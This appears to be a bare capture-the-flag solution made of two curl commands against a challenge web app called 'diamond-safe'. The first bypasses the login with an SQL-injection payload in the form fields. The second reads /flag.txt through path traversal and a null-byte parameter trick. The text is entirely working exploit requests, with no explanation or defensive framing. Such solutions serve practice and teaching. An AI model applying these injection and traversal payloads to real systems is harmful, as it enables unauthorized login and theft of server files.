# Login
curl 'https://diamond-safe.flu.xxx/login.php' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'cookie: PHPSESSID=3d9dc29debc998c9c40b3007319ebed5' \
  --data-raw 'password=mysecret%25s&name[]=)%20or%202%3C%3E(&name[]=default'

# LFI /flag.txt
curl --path-as-is 'https://diamond-safe.flu.xxx/download.php?file_name=Diamond.txt&h=95f0dc5903ee9796c3503d2be76ad159&file_name%00=../../../flag.txt' \
  -H 'Neptunian: neptunian-value' \
  -H 'Cookie: PHPSESSID=3d9dc29debc998c9c40b3007319ebed5'